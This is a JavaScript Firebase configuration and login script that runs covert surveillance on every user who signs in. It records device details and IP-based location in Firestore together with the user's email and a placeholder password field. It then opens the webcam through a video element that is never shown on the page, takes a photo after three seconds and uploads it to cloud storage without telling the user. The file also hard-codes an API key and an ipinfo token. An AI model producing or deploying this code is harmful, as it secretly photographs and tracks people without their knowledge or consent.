// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzg4PmFoXnS95TXk8FlG9C4bSxhfer86E",
    authDomain: "wailai-a.firebaseapp.com",
    projectId: "wailai-a",
    storageBucket: "wailai-a.appspot.com",
    messagingSenderId: "857204915249",
    appId: "1:857204915249:web:0141c2e2e68ed96769e910",
    measurementId: "G-VRR62LMMMK"
};

// Initialize Firebase
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}

// Get references to services
const auth = firebase.auth();
const firestore = firebase.firestore();
const storage = firebase.storage();

// Function to get device information
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const browserName = navigator.appName;
    const browserVersion = navigator.appVersion;
    const platform = navigator.platform;
    const language = navigator.language;
    return { userAgent, browserName, browserVersion, platform, language };
}

// Function to get location information
function getLocationInfo(callback) {
    fetch('https://ipinfo.io/json?token=cd0380c4a96a2b')
        .then(response => response.json())
        .then(data => callback(data))
        .catch(error => {
            console.error('Error fetching location info:', error);
            callback(null);
        });
}

// Capture image from video
function captureImage(video, canvas) {
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    return new Promise((resolve, reject) => {
        canvas.toBlob(blob => {
            if (blob) {
                resolve(blob);
            } else {
                reject(new Error('Failed to capture image'));
            }
        }, 'image/jpeg');
    });
}

// Upload image to Firebase Storage
function uploadImage(blob, userId, timestamp) {
    const imageRef = storage.ref(`images/${userId}_${timestamp}.jpg`);
    return imageRef.put(blob);
}

// Check if user is logged in
auth.onAuthStateChanged(user => {
    if (user) {
        const deviceInfo = getDeviceInfo();
        const timestamp = new Date().toISOString();

        const email = user.email;
        const password = '******'; // Placeholder for password

        getLocationInfo(locationInfo => {
            const userData = {
                lastLogin: timestamp,
                deviceInfo: deviceInfo,
                locationInfo: locationInfo,
                email: email,
                password: password
            };

            // Create or update user data in Firestore
            firestore.collection('users').doc(user.uid).set(userData, { merge: true })
                .then(() => console.log('User data updated successfully'))
                .catch(error => console.error('Error updating user data:', error));
        });

        // Access user's camera and capture an image
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        captureImage(video, canvas).then(blob => {
                            uploadImage(blob, user.uid, timestamp)
                                .then(() => {
                                    console.log('Image uploaded successfully');
                                    stream.getTracks().forEach(track => track.stop()); // Stop the camera
                                })
                                .catch(error => console.error('Error uploading image:', error));
                        }).catch(error => console.error('Error capturing image:', error));
                    }, 3000); // Capture image after 3 seconds
                };
            })
            .catch(error => console.error('Error accessing camera:', error));
    }
});
